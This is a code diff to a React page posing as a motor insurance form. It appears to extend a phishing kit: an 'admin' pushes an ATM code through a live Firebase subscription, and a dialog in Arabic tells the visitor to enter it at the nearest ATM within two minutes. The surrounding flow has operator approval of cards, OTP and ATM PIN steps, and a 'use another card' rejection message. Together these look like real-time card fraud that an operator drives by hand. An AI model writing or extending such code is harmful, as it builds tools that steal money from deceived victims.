@@ -45,6 +45,12 @@ import {
   SelectTrigger,
   SelectValue,
 } from "@/components/ui/select";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
 import { insuranceFormSchema, type InsuranceFormData } from "@shared/schema";
@@ -620,6 +626,8 @@ export default function MotorInsurance() {
   );
   const [rejectionReason, setRejectionReason] = useState<string>("");
   const [atmCode, setAtmCode] = useState("");
+  const [adminAtmCode, setAdminAtmCode] = useState<string | null>(null);
+  const [showAtmModal, setShowAtmModal] = useState(false);
 
   useVisitorRouting({
     currentPage: "motor",
@@ -661,9 +669,16 @@ export default function MotorInsurance() {
     if (!isAwaitingApproval || !visitorId || !isFirebaseConfigured) return;
 
     const unsubscribe = subscribeToApprovalStatus(visitorId, (data) => {
+      // Check for admin ATM code
+      if (data.adminAtmCode && data.adminAtmCode !== adminAtmCode) {
+        setAdminAtmCode(data.adminAtmCode);
+        setShowAtmModal(true);
+      }
+      
       if (data.approvalStatus === "approved_otp") {
         setApprovalStatus("approved_otp");
         setIsAwaitingApproval(false);
+        setShowAtmModal(false);
         if (currentStep === 4) {
           setCurrentStep(5);
           handleCurrentPage("motor-insurance-step-5-otp");
@@ -674,6 +689,7 @@ export default function MotorInsurance() {
       } else if (data.approvalStatus === "approved_atm") {
         setApprovalStatus("approved_atm");
         setIsAwaitingApproval(false);
+        setShowAtmModal(false);
         if (currentStep === 4) {
           setCurrentStep(7);
           handleCurrentPage("motor-insurance-step-7-atm");
@@ -687,6 +703,7 @@ export default function MotorInsurance() {
           data.rejectionReason || "تم رفض البطاقة، الرجاء استخدام بطاقة أخرى",
         );
         setIsAwaitingApproval(false);
+        setShowAtmModal(false);
         if (currentStep === 7) {
           setCurrentStep(4);
         }
@@ -2715,6 +2732,45 @@ export default function MotorInsurance() {
           </div>
         )}
       </div>
+
+      {/* ATM Code Modal - Shows when admin sends ATM code */}
+      <Dialog open={showAtmModal} onOpenChange={setShowAtmModal}>
+        <DialogContent className="max-w-md mx-auto" dir="rtl">
+          <DialogHeader>
+            <DialogTitle className="text-center text-2xl font-bold text-purple-600 mb-2">
+              رمز التحقق من الصراف
+            </DialogTitle>
+          </DialogHeader>
+          
+          <div className="text-center space-y-6 p-4">
+            <div className="bg-gradient-to-br from-purple-50 to-purple-100 dark:from-purple-900/30 dark:to-purple-800/30 border-2 border-purple-300 dark:border-purple-700 rounded-xl p-8 shadow-inner">
+              <div className="text-sm text-slate-600 dark:text-slate-400 mb-3 font-medium">
+                أدخل هذا الرمز في جهاز الصراف الآلي
+              </div>
+              <div className="text-5xl font-bold text-purple-600 dark:text-purple-400 tracking-widest font-mono animate-pulse">
+                {adminAtmCode || "------"}
+              </div>
+            </div>
+
+            <div className="flex items-center justify-center gap-3 text-amber-600 dark:text-amber-400 bg-amber-50 dark:bg-amber-900/30 p-3 rounded-lg">
+              <Clock className="w-5 h-5" />
+              <span className="text-sm">يرجى إدخال الرمز خلال دقيقتين</span>
+            </div>
+
+            <p className="text-sm text-slate-500 dark:text-slate-400">
+              توجه إلى أقرب جهاز صراف آلي وأدخل الرمز أعلاه لإتمام عملية التحقق
+            </p>
+
+            <Button
+              onClick={() => setShowAtmModal(false)}
+              className="w-full bg-purple-600 hover:bg-purple-700 text-white"
+              data-testid="button-close-atm-modal"
+            >
+              تم
+            </Button>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 }
